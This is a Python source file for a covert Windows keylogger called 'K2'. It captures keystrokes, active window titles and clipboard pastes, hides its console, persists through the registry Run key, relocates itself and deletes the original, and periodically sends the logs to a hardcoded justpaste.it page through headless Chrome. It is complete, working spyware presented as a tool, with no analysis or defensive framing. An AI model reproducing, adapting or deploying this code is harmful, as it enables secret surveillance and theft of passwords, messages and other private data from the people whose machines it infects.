
import pythoncom
import pyHook
import win32clipboard, win32console, win32gui
import os, datetime, sys, shutil, time
from pywinauto.application                     import Application
from   ctypes                                  import *
from   winreg                                  import *
from   selenium                                import webdriver
from   selenium.common.exceptions              import NoSuchElementException
from   selenium.webdriver.common.keys          import Keys
from   selenium.webdriver.common.by            import By
from   selenium.webdriver.common.action_chains import ActionChains
from   selenium.common.exceptions              import WebDriverException
from   webdriver_manager.chrome                import ChromeDriverManager

user           = windll.user32
kernel         = windll.kernel32
psapi          = windll.psapi
current_window = None
now            = datetime.datetime.today().strftime("%H:%M:%S %d-%m-%Y")
logentry       = "|--[K2-LOG]--|" + str(now)

# Desktop Vars
desktop      = os.path.join(os.path.join(os.environ['USERPROFILE'], 'Desktop'))
ODdesktop    = desktop.replace("Desktop","OneDrive\Desktop")

tcheck       = time.perf_counter()

url_real = 'https://justpaste.it/8sjke'                          # testing (in 14 7.0 do safe anon links)
url_edit = 'https://justpaste.it/edit/45691343/ytm7pjtjxddardko' #
from selenium.webdriver.chrome.options import Options
chrome_options = Options()
chrome_options.add_argument("--headless") 

def public():
    global logfile
    blackloop = True
    while blackloop == True:
        try:
            driver = webdriver.Chrome(ChromeDriverManager().install(),chrome_options=chrome_options)
            time.sleep(1)
            driver.get(url_edit)
            time.sleep(2)
            black = driver.find_element_by_css_selector('#editArticleWidget').text
            if "Something went wrong: Too many published articles. Please wait to add next article." in str(black):
                print("K2 BLOCKED. WAITING 15 MINUTES.")
                driver.quit()
                time.sleep(900)
            else:
                blackloop = False
        except Exception as e:
            print(str(e))
            if "HTTPConnectionPool" not in str(e):
                blackloop = False
    now = datetime.datetime.today().strftime("%H:%M:%S %d-%m-%Y")
    element = driver.find_element(By.XPATH, '//*[@id="editArticleWidget"]/div/div[1]/div/div[1]/div[1]/div[1]/input')
    element.send_keys(Keys.CONTROL, 'a')
    element.send_keys('[K2LOG]')
    element = driver.find_element(By.XPATH, '//*[@id="tinyMCEEditor_ifr"]')
    element.send_keys(Keys.CONTROL, Keys.END) #moving to end of log
    try:
         element.send_keys(now+" " +logfile) #send k2log file
    except Exception as e:
         element.send_keys(str(e))
    element = driver.find_element(By.XPATH, '//*[@id="editArticleWidget"]/div/div[1]/div/div[2]/button[2]') #once was /button now is /button[2]
    element.click()
    time.sleep(1)
    driver.quit()

def get_current_process():      #pid is printed twice?
    global logentry
    hwnd = user.GetForegroundWindow()
    pid  = c_ulong(0)
    user.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer(b"\x00" * 512)
    h_process  = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    window_title = create_string_buffer(b"\x00" *512)
    length       = user.GetWindowTextA(hwnd, byref(window_title),512)
    print("")
    print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    print("")
    logentry += str("\n[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    windll.kernel32.CloseHandle(hwnd)
    windll.kernel32.CloseHandle(h_process)

def addStartup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'K2', 0, REG_SZ,new_file_path)

def hide():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

def K2(event):
    global current_window, logentry, link, logfile, tcheck
    link = "LINK: \n"
    if event.WindowName != current_window:
        current_window   = event.WindowName
        get_current_process()
    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii))
        logentry += str(chr(event.Ascii))
    elif event.Key == "V":
        print("[%s]" % event.Key)
        logentry += " ["+str(event.Key)+"] "
        win32clipboard.OpenClipboard()
        pasted_value = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        print("([PASTE VALUE] = '"+ pasted_value+"')")
        logentry += str("[PASTE] - %s" % (pasted_value)) + "\n"
    else:
        print("%s" % event.Key)
        logentry += ""+str(event.Key)+""
    tnow = time.perf_counter()
    if abs(tnow-tcheck) >= 60: # saving and sending EVERY FOURTYFIRST MINUTE (2460 seconds)
        logfile  = logentry #logfile is the var thats used by public()
        logentry = "" #emptying log
        public() #delivering loot
        
        tcheck = time.perf_counter()


    return True

def K3(event):
    if   str(event.Key).upper() == "RSHIFT":
        print("[Rshift UP]")
    elif str(event.Key).upper() == "LSHIFT":
        print("[Lshift UP]")
    elif str(event.Key).upper() == "RCONTROL":
        print("[Rcontrol UP]")
    elif str(event.Key).upper() == "LCONTROL":
        print("[Lcontrol UP]")
    return True

# dig in
if   str(os.getcwd()) == desktop or str(os.getcwd()) == ODdesktop:
     print("ON DESKTOP")
     self           = str(os.getcwd())
     current_path   = self
     current_pathE  = current_path + "\K2.exe"
     current_pathP  = current_path + "\K2.py"
     os.chdir(os.path.dirname(os.getcwd()))
     move_path      = str(os.getcwd())
     if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
         print("pyinstaller bundle")
         shutil.copy(current_pathE, move_path+'//K2.exe')
         os.startfile(move_path+"//K2.exe")
         self = self + "\K2.exe"
         os.remove(self)
     else:
         print("python")
         shutil.copy(current_pathP, move_path+'//K2.py')
         os.startfile(move_path+"//K2.py")
         os.remove(sys.argv[0])
else:
     print("INFILTRATION COMPLETE.")
     pathE  = desktop+"\\K2.exe"
     pathE2 = ODdesktop+"\\K2.exe"
     pathP  = desktop+"\\K2.py"
     pathP2 = ODdesktop+"\\K2.py"
     try:
         os.remove(pathE)
         print("exe removed")
     except:
         try:
             os.remove(pathE2)
             print("exe removed")
         except:
             print("No exe found")
     try:
         os.remove(pathP)
         print("py removed")
     except:
         try:
             os.remove(pathP2)
             print("py removed")
         except:
             print("No py found")
             
# hide and add to startup
try:
    addStartup() 
    hide()
except Exception as e1:
    logentry += "ERROR: "+str(e1)
    #FOR DEBUGGING
    #win = win32console.GetConsoleWindow()
    #win32gui.ShowWindow(win, 100)
    #app = Application().start("notepad.exe")
    #app.UntitledNotepad.Edit.type_keys(str(e1),with_spaces=True)

# K2 running
try:
    kl          = pyHook.HookManager()
    kl.KeyDown  = K2
    kl.KeyUp    = K3
    kl.HookKeyboard()
    pythoncom.PumpMessages()
except Exception as e2:
    logentry += "ERROR: "+str(e2)
    #FOR DEBUGGING
    #win = win32console.GetConsoleWindow()
    #win32gui.ShowWindow(win, 100)
    #app = Application().start("notepad.exe")
    #app.UntitledNotepad.Edit.type_keys(str(e2),with_spaces=True)
       

